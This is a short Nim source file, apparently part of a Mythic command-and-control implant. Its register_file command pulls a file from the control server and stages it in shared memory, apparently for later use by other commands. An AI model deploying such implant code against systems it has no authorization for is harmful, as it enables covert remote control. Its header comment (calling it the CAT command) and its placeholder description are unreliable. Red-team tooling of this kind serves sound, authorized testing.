# This is the source for the CAT command
import ../structs
import ../utils
import json
import ../fileManager
import std/options
import std/tables

#[
Short Command Description
  {"path": "anwiththestruct"}

]#
proc cmd_register_file*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let fileId = params["file_id"].getStr()
  let fileName = params["file_name"].getStr()

  # Configure Output
  var
    status = ""
    fileBuffer: seq[byte]

  # Loop the downloaded chunks and write them to
  # the global file buffer
  for chunk in downloadFileFromMythic(fileId, task.id):
    if chunk.isSome():
      fileBuffer &= chunk.get()
    else:
      DBG("An error occured downloading the file")
      status = "error"
      break


  # reallocate the right amount of memory
  var sharedFileBuf = allocShared(len(fileBuffer))

  if len(fileBuffer) >= 1:
    copyMem(sharedFileBuf, addr fileBuffer[0], len(fileBuffer))
    sharedBuffer[filename] = (len(fileBuffer), sharedFileBuf)
  else:
    status = "error"

  # clean the file buffer
  fileBuffer = @[]

  # return the response
  return buildReturnData(task.id, "", status)

